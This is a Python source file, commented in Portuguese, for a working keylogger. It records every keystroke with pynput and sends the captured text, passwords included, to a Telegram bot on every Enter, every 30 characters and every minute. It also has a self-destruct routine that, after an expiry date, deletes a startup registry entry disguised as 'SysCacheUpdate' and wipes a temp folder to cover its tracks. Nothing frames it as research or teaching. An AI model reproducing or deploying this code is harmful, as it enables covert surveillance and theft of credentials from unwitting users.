import requests
from pynput.keyboard import Key, Listener
import time
import threading
import os
import datetime
import subprocess
import sys

# --- CONFIGURAÇÕES ---
TOKEN = "SEU_NOVO_TOKEN_AQUI"
CHAT_ID = "SEU_NOVO_CHAT_ID_AQUI"
DATA_EXPIRACAO = datetime.date(2026, 12, 31) 

# --- SISTEMA DE AUTODESTRUIÇÃO ---
if datetime.date.today() > DATA_EXPIRACAO:
    os.system('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SysCacheUpdate" /f')
    subprocess.Popen('timeout /t 5 && del /q %TEMP%\\sys_cache\\*.*', shell=True)
    sys.exit()

buffer = ""

def send_to_telegram(text):
    if text.strip():
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        payload = {"chat_id": CHAT_ID, "text": text}
        try:
            requests.post(url, data=payload, timeout=10)
        except:
            pass

def on_press(key):
    global buffer
    try:
        buffer += key.char
    except AttributeError:
        if key == Key.space:
            buffer += " "
        elif key == Key.enter:
            send_to_telegram(buffer + " [ENTER]")
            buffer = ""
        elif key == Key.backspace:
            buffer = buffer[:-1]
        else:
            buffer += f" [{str(key).replace('Key.', '')}] "

    if len(buffer) >= 30:
        send_to_telegram(buffer)
        buffer = ""

def auto_send():
    global buffer
    while True:
        time.sleep(60)
        if buffer:
            send_to_telegram(buffer + " [AUTO-SEND]")
            buffer = ""

threading.Thread(target=auto_send, daemon=True).start()

with Listener(on_press=on_press) as listener:
    listener.join()
